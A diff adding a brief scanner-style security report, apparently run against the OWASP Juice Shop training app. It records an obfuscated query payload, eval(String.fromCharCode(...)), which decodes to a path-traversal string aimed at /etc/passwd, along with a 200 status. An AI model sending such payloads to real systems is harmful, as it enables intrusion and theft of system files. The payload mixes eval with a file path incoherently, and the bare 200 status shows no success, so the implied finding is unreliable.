@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))
+
+[STATUS]: 200
+[PAYLOAD]: eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))
+---
